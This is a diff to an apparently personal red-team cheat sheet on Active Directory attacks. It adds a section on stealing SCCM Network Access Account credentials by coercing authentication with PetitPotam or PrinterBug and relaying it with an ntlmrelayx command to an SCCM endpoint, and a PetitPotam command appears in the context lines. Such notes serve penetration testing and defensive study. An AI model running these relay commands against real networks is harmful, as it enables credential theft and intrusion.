@@ -59,6 +59,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Request User Certificate](#request-user-certificate)
 	* [Shadow Credentials](#shadow-credentials)
 	* [ESC8](#esc8)
+	* [SCCM NAA Credentials](#stealing-sccm-naa-credentials)
 	* [Webdav to LDAP(S)](#webdav-to-ldap(s))
 	* [NetNTLMv1 to LDAP](#netntlmv1-to-ldap)
 * **[Kerberos Relay](#kerberos-relay)**
@@ -700,6 +701,12 @@ py PetitPotam.py 192.168.86.193 192.168.86.182
 
 ### ESC8
 ```
+```
+
+### Stealing SCCM NAA Credentials
+This attack would require a coercion methods (PetitPotam, PrinterBug, etc.) in order to relay to an SCCM http endpoint (`http://SCCM01/ccm_system/request` ). However as far as this is updated (10/13/2022), PR hasn't been merged yet. Here is the PR [link](https://github.com/SecureAuthCorp/impacket/pull/1425)
+```
+ntlmrelayx.py -t http://SCCM01/ccm_system/request --sccm --sccm-device Relay-Device --sccm-fqdn
 ```
 
 ### Webdav to LDAP(S)
